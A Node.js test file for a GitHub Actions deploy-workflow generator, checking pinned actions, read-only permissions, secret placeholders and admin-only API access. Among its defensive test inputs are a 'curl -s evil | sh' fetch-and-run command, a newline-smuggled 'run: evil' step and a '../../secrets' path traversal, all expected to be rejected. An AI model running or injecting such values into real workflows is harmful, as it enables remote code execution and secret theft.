import assert from "node:assert/strict";
import { test } from "node:test";
import { generateGithubWorkflow, PINNED_ACTION_SHA } from "../apps/api/lib/github-workflow.mjs";
import { startServer } from "./helpers/harness.mjs";

test("RC14 generates an immutable, least-privilege GitHub workflow with secret placeholders only",()=>{
  const id = "bd156fd3-7cf6-4921-8234-6e9cedd84030";
  const npm = generateGithubWorkflow({projectId:id,outputDir:"dist",buildMode:"npm"});
  assert.equal(npm.fileName,"arcunara-deploy.yml");
  assert.ok(npm.content.includes("name: Arcunara static publish"));
  assert.match(npm.content,/on:\n  push:\n    branches: \[main\]/);
  assert.match(npm.content,/workflow_dispatch:/);
  assert.match(npm.content,/permissions:\n  contents: read/);
  assert.match(npm.content,/npm ci/);
  assert.match(npm.content,/npm run build/);
  assert.ok(npm.content.includes(`uses: xiongfh2008/arcunara-studio@${PINNED_ACTION_SHA}`));
  assert.ok(npm.content.includes(`project-id: "${id}"`));
  assert.ok(npm.content.includes("$" + "{{ secrets.ARCU_API_BASE }}"));
  assert.ok(npm.content.includes("$" + "{{ secrets.ARCU_DEPLOY_KEY }}"));
  assert.deepEqual(npm.requiredSecrets,["ARCU_API_BASE","ARCU_DEPLOY_KEY"]);
  assert.doesNotMatch(npm.content,/api[_-]?token\s*[:=]|dpk_[A-Za-z0-9_-]{10,}/i);
  const none=generateGithubWorkflow({projectId:id,outputDir:"public",buildMode:"none"});
  assert.doesNotMatch(none.content,/npm ci|npm run build/);
  assert.match(none.content,/output-dir: "public"/);
  assert.throws(()=>generateGithubWorkflow({projectId:id,outputDir:"../../secrets"}),/Unsupported/);
  assert.throws(()=>generateGithubWorkflow({projectId:id,buildMode:"curl -s evil | sh"}),/Invalid/);
  assert.throws(()=>generateGithubWorkflow({projectId:"a\nrun: evil"}),/Invalid/);
});

test("RC14 workflow endpoint requires admin, checks existence and disallows deploy-key access",async()=>{
  const server=await startServer();
  try {
    const response=await server.api("/api/projects",{
      method:"POST",headers:{"content-type":"application/json"},
      body:JSON.stringify({name:"GitHub workflow",html:"<html>site</html>"})
    });
    assert.equal(response.status,201);
    const id=response.json.id;
    const url=`/api/projects/${id}/github-workflow?outputDir=build&buildMode=none`;
    const generated=await server.api(url);
    assert.equal(generated.status,200);
    assert.equal(generated.json.outputDir,"build");
    assert.equal(generated.json.buildMode,"none");
    assert.equal(generated.json.content.includes(id),true);
    assert.equal((await server.api(url,{token:null})).status,401);
    assert.equal((await server.api(`/api/projects/${id}/github-workflow?outputDir=../../bad`)).status,400);
    assert.equal((await server.api(`/api/projects/${id}/github-workflow?buildMode=bad`)).status,400);
    assert.equal((await server.api("/api/projects/00000000-0000-0000-0000-000000000000/github-workflow")).status,404);
    const key=await server.api(`/api/projects/${id}/deploy-keys`,{
      method:"POST",headers:{"content-type":"application/json"},body:"{}"
    });
    assert.equal(key.status,201);
    const noPrivilege=await server.api(url,{token:key.json.token});
    assert.equal(noPrivilege.status,403);
    const trash=await server.api(`/api/projects/${id}`,{
      method:"PATCH",headers:{"content-type":"application/json"},
      body:JSON.stringify({lifecycleState:"trashed"})
    });
    assert.equal(trash.status,200);
    assert.equal((await server.api(url)).status,409);
  } finally { await server.stop();await server.cleanup(); }
});
